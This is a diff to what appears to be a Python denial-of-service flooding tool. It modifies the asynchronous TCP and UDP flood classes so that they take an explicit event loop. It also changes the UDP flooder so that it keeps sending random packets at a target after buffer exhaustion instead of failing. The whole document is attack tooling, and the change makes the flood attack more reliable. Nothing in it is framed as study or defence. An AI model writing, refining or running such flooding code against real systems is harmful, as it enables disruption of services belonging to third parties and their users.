@@ -4,6 +4,7 @@ import asyncio
 
 import logging
 from contextlib import suppress
+import errno
 from itertools import cycle
 from math import log2, trunc
 from os import urandom as randbytes
@@ -903,7 +904,12 @@ class HttpFlood:
 # XXX: there's literally no need for this class to exist
 class AsyncTcpFlood(HttpFlood):
 
+    def __init__(self, *args, loop=None):
+        super().__init__(*args)
+        self._loop = loop
+
     async def run(self) -> bool:
+        assert self._loop is not None, "Event loop has to be set to run async flooder"
         return await self.SENT_FLOOD()
 
     # note that TCP_NODELAY is set by default since Python3.6+
@@ -1198,31 +1204,51 @@ class AsyncTcpFlood(HttpFlood):
 
 class AsyncUdpFlood(Layer4):
 
+    def __init__(self, *args, loop=None):
+        super().__init__(*args)
+        self._loop = loop
+
     async def run(self) -> bool:
+        assert self._loop is not None, "Event loop has to be set to run async flooder"
         return await self.SENT_FLOOD()
 
-    # XXX: have to process "no buffer OSError Errno=55 manually
     async def UDP(self) -> bool:
         packets_sent, packet_size = 0, 1024
-        # XXX: this is not going to work as well, need to pass as params
-        loop = asyncio.get_event_loop()
         with socket(AF_INET, SOCK_DGRAM) as sock:
-            await asyncio.wait_for(loop.sock_connect(sock, self._target), timeout=SOCK_TIMEOUT)
+            await asyncio.wait_for(
+                self._loop.sock_connect(sock, self._target), timeout=SOCK_TIMEOUT)
             while True:
                 packet = randbytes(packet_size)
-                await asyncio.wait_for(loop.sock_sendall(sock, packet), timeout=1)
+                try:
+                    await asyncio.wait_for(self._loop.sock_sendall(sock, packet), timeout=1)
+                except OSError as exc:
+                    if exc.errno == errno.ENOBUFS:
+                        await asyncio.sleep(0.5)
+                    else:
+                        raise exc
                 self._stats.track(1, packet_size)
                 packets_sent += 1
         return packets_sent > 0
 
 
-def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
+def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None, loop=None):
     if method not in Methods.ALL_METHODS:
         exit(f"Method {method} Not Found")
 
     (url, ip), proxies = Tools.parse_params(url, ip, proxies)
     if method in Methods.LAYER7_METHODS:
-        return AsyncTcpFlood(url, ip, method, rpc, event, USERAGENTS, REFERERS, proxies, stats)
+        return AsyncTcpFlood(
+            url,
+            ip,
+            method,
+            rpc,
+            event,
+            USERAGENTS,
+            REFERERS,
+            proxies,
+            stats,
+            loop=loop,
+        )
 
     if method in Methods.LAYER4_METHODS:
         port = url.port
@@ -1249,4 +1275,4 @@ def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
             if not ref:
                 exit("Empty Reflector File ")
 
-        return AsyncUdpFlood((ip, port), ref, method, event, proxies, stats)
+        return AsyncUdpFlood((ip, port), ref, method, event, proxies, stats, loop=loop)
